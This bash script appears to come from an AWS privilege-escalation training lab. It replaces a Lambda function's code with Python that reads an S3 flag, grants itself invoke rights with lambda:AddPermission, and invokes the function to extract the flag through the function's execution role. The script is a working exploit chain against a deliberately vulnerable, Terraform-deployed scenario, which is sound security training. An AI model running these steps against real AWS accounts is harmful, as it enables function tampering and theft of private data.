#!/bin/bash

# Demo script for lambda:UpdateFunctionCode + lambda:AddPermission to S3 bucket access
# This scenario demonstrates how a user with lambda:UpdateFunctionCode and lambda:AddPermission
# can modify existing Lambda function code, grant themselves invoke permission, and read
# sensitive S3 bucket contents using the function's privileged execution role.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-lambda-005-to-bucket-starting-user"
TARGET_LAMBDA="pl-prod-lambda-005-to-bucket-target-lambda"
LAMBDA_EXEC_ROLE="pl-prod-lambda-005-to-bucket-lambda-exec-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Lambda UpdateFunctionCode + AddPermission to S3 Bucket Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_lambda_005_lambda_updatefunctioncode_lambda_addpermission.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract target bucket name from the grouped output
TARGET_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')

if [ "$TARGET_BUCKET" == "null" ] || [ -z "$TARGET_BUCKET" ]; then
    echo -e "${RED}Error: Could not extract target bucket name from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Extract admin credentials for pre-flight cleanup
ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target bucket: $TARGET_BUCKET"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Pre-flight cleanup: remove any stale resource policy statements from previous demo runs.
# Without this, a prior run that added AllowStartingUserInvoke-* would let the starting
# user invoke before step 8, causing the preflight check to give a false positive.
echo -e "${YELLOW}Pre-flight: Removing any stale Lambda resource policy statements${NC}"
STALE_POLICY=$(AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY" AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY" \
    aws lambda get-policy \
    --region "$AWS_REGION" \
    --function-name "$TARGET_LAMBDA" \
    --query 'Policy' \
    --output text 2>/dev/null || echo "")

if [ -n "$STALE_POLICY" ]; then
    STALE_SIDS=$(echo "$STALE_POLICY" | jq -r '.Statement[] | select(.Sid | startswith("AllowStartingUserInvoke")) | .Sid' 2>/dev/null || echo "")
    if [ -n "$STALE_SIDS" ]; then
        while IFS= read -r SID; do
            [ -z "$SID" ] && continue
            AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY" AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY" \
                aws lambda remove-permission \
                --region "$AWS_REGION" \
                --function-name "$TARGET_LAMBDA" \
                --statement-id "$SID" 2>/dev/null || true
            echo "Removed stale statement: $SID"
        done <<< "$STALE_SIDS"
        echo -e "${GREEN}✓ Stale resource policy statements removed${NC}\n"
    else
        echo -e "${GREEN}✓ No stale statements found${NC}\n"
    fi
else
    echo -e "${GREEN}✓ No resource policy on Lambda (clean state)${NC}\n"
fi

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have S3 access yet and cannot invoke the Lambda
echo -e "${YELLOW}Step 4: Verifying starting user has no S3 access and no Lambda invoke permission${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Attempting to list target bucket contents (should fail)..."
show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET/"
if aws s3 ls s3://$TARGET_BUCKET/ &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have S3 access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access S3 bucket (as expected)${NC}"
fi

echo ""
echo "Attempting to invoke target Lambda directly (should fail — no resource policy yet)..."
show_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/preflight_response.json"
if aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/preflight_response.json &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly can invoke Lambda already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot invoke Lambda without resource policy (as expected)${NC}"
fi
rm -f /tmp/preflight_response.json
echo ""

# [OBSERVATION] Step 5: Get information about the target Lambda function
echo -e "${YELLOW}Step 5: Getting target Lambda function details${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "Target Lambda function: $TARGET_LAMBDA"

show_cmd "ReadOnly" "aws lambda get-function --region $AWS_REGION --function-name $TARGET_LAMBDA --query 'Configuration.FunctionArn' --output text"
LAMBDA_ARN=$(aws lambda get-function \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --query 'Configuration.FunctionArn' \
    --output text)

echo "Lambda ARN: $LAMBDA_ARN"

# Also retrieve the starting user ARN using readonly creds so we don't need starting creds later
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Arn' --output text"
# We need the starting user ARN — derive it from account ID and known user name
STARTING_USER_ARN="arn:aws:iam::$ACCOUNT_ID:user/$STARTING_USER"
echo "Starting user ARN: $STARTING_USER_ARN"
echo -e "${GREEN}✓ Found target Lambda function${NC}\n"

# Step 6: Create malicious Lambda code that reads S3 flag
echo -e "${YELLOW}Step 6: Creating malicious Lambda code${NC}"
echo "Creating Python code that will read the S3 flag via the Lambda execution role..."

cat > /tmp/lambda_function.py << EOF
import boto3
import json

def lambda_handler(event, context):
    """
    Malicious Lambda function that reads the S3 flag object
    and returns its contents in the response.
    The Lambda execution role has s3:GetObject on the target bucket.
    The target bucket name is passed in the event payload.
    """
    s3 = boto3.client('s3')

    try:
        bucket = event.get('bucket', '')

        if not bucket:
            return {
                'statusCode': 500,
                'body': json.dumps({'error': 'bucket key missing from event payload'})
            }

        obj = s3.get_object(Bucket=bucket, Key='flag.txt')
        flag = obj['Body'].read().decode('utf-8').strip()

        return {
            'statusCode': 200,
            'body': json.dumps({'flag': flag})
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps({'error': str(e)})
        }
EOF

# Create zip file
cd /tmp
zip -q lambda_function.zip lambda_function.py
if [ $? -ne 0 ] || [ ! -f /tmp/lambda_function.zip ]; then
    echo -e "${RED}Error: Failed to create lambda_function.zip${NC}"
    exit 1
fi
cd - > /dev/null

echo -e "${GREEN}✓ Created malicious Lambda code${NC}\n"

# [EXPLOIT] Step 7: Update Lambda function code with malicious payload
echo -e "${YELLOW}Step 7: Updating Lambda function with malicious code${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Using lambda:UpdateFunctionCode permission to replace the function's code..."

show_attack_cmd "Attacker" "aws lambda update-function-code --region $AWS_REGION --function-name $TARGET_LAMBDA --zip-file fileb:///tmp/lambda_function.zip"
aws lambda update-function-code \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --zip-file fileb:///tmp/lambda_function.zip \
    --output text > /dev/null

echo -e "${GREEN}✓ Successfully updated Lambda function code${NC}\n"

# Wait for Lambda code update to reach Successful state before adding permissions.
# Using readonly creds because lambda:GetFunction is in the "helpful" permission set
# which may be restricted during a validation run — readonly user always has read access.
echo -e "${YELLOW}Waiting for Lambda code update to reach Successful state...${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
MAX_WAIT=60
WAITED=0
while [ "$WAITED" -lt "$MAX_WAIT" ]; do
    UPDATE_STATUS=$(aws lambda get-function \
        --region "$AWS_REGION" \
        --function-name "$TARGET_LAMBDA" \
        --query 'Configuration.LastUpdateStatus' \
        --output text 2>/dev/null)
    if [ "$UPDATE_STATUS" = "Successful" ]; then
        echo -e "${GREEN}✓ Lambda code update complete (LastUpdateStatus: Successful)${NC}\n"
        break
    fi
    echo "  LastUpdateStatus: $UPDATE_STATUS — waiting 5s..."
    sleep 5
    WAITED=$((WAITED + 5))
done
if [ "$WAITED" -ge "$MAX_WAIT" ]; then
    echo -e "${YELLOW}Warning: Lambda update did not reach Successful within ${MAX_WAIT}s, proceeding${NC}"
fi

# [EXPLOIT] Step 8: Add resource-based permission to allow self-invocation
echo -e "${YELLOW}Step 8: Adding resource-based permission to invoke the Lambda function${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Using lambda:AddPermission to grant our own user the right to invoke the function..."
echo "Without this, even lambda:InvokeFunction in the identity policy is blocked by the absence of a resource policy."

# Use a timestamp-based statement ID to avoid conflicts across demo runs
STATEMENT_ID="AllowStartingUserInvoke-$(date +%s)"

show_attack_cmd "Attacker" "aws lambda add-permission --region $AWS_REGION --function-name $TARGET_LAMBDA --statement-id \"$STATEMENT_ID\" --action lambda:InvokeFunction --principal $STARTING_USER_ARN"
aws lambda add-permission \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --statement-id "$STATEMENT_ID" \
    --action "lambda:InvokeFunction" \
    --principal "$STARTING_USER_ARN" \
    --output text > /dev/null

echo -e "${GREEN}✓ Successfully added invoke permission for $STARTING_USER${NC}\n"

# [EXPLOIT] Step 9: Invoke the malicious Lambda function
echo -e "${YELLOW}Step 9: Invoking malicious Lambda function to read S3 flag${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "The Lambda will execute as $LAMBDA_EXEC_ROLE which has s3:GetObject on the target bucket..."
echo "Passing the target bucket name in the event payload so the payload knows where to read the flag from..."

INVOKE_PAYLOAD="{\"bucket\": \"$TARGET_BUCKET\"}"
show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '$INVOKE_PAYLOAD' /tmp/response.json"
aws lambda invoke \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --payload "$INVOKE_PAYLOAD" \
    /tmp/response.json \
    --query 'StatusCode' \
    --output text > /dev/null

# Check that the invocation produced output
if [ ! -f /tmp/response.json ]; then
    echo -e "${RED}✗ Lambda invocation produced no output${NC}"
    exit 1
fi

echo "Lambda response:"
cat /tmp/response.json | jq .
echo ""

# Extract the flag from the response body
RESPONSE_STATUS=$(cat /tmp/response.json | jq -r '.statusCode' 2>/dev/null)
if [ "$RESPONSE_STATUS" != "200" ]; then
    echo -e "${RED}✗ Lambda returned non-200 status code: $RESPONSE_STATUS${NC}"
    cat /tmp/response.json | jq .
    exit 1
fi

FLAG_FROM_LAMBDA=$(cat /tmp/response.json | jq -r '.body' | jq -r '.flag' 2>/dev/null)

if [ -z "$FLAG_FROM_LAMBDA" ] || [ "$FLAG_FROM_LAMBDA" == "null" ]; then
    echo -e "${RED}✗ Could not parse flag from Lambda response${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Lambda execution successful — flag extracted from S3 via Lambda execution role${NC}"
echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED${NC}\n"

# [EXPLOIT] Step 10: Capture the CTF flag
# The Lambda already read flag.txt from the target bucket and returned it in the response.
# Display it explicitly as the flag-capture step.
echo -e "${YELLOW}Step 10: Capturing CTF flag${NC}"
echo "The flag was returned by the Lambda function which read it from s3://$TARGET_BUCKET/flag.txt"
show_attack_cmd "Attacker" "cat /tmp/response.json | jq -r '.body | fromjson | .flag'"
FLAG_VALUE=$(cat /tmp/response.json | jq -r '.body | fromjson | .flag' 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "null" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to extract flag from Lambda response${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (no S3 access, no Lambda invoke permission)"
echo "2. Used lambda:UpdateFunctionCode to replace $TARGET_LAMBDA with code that reads s3://$TARGET_BUCKET/flag.txt"
echo "3. Used lambda:AddPermission to grant ourselves invoke permission on the function"
echo "4. Invoked the modified Lambda with the bucket name in the event payload — it executed as $LAMBDA_EXEC_ROLE which has s3:GetObject"
echo "5. Extracted flag from Lambda response: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (lambda:UpdateFunctionCode) → $TARGET_LAMBDA (modified)"
echo "  → (lambda:AddPermission) → Allow self-invoke"
echo "  → (lambda:InvokeFunction) → Execute as $LAMBDA_EXEC_ROLE"
echo "  → (s3:GetObject flag.txt) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified Lambda function code: $TARGET_LAMBDA"
echo "- Added resource-based permission statement: $STATEMENT_ID"
echo "- Temporary files: /tmp/lambda_function.py, /tmp/lambda_function.zip, /tmp/response.json"

echo -e "\n${RED}⚠ Warning: Lambda function contains malicious code and has a resource policy allowing self-invoke${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  run plabs cleanup or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
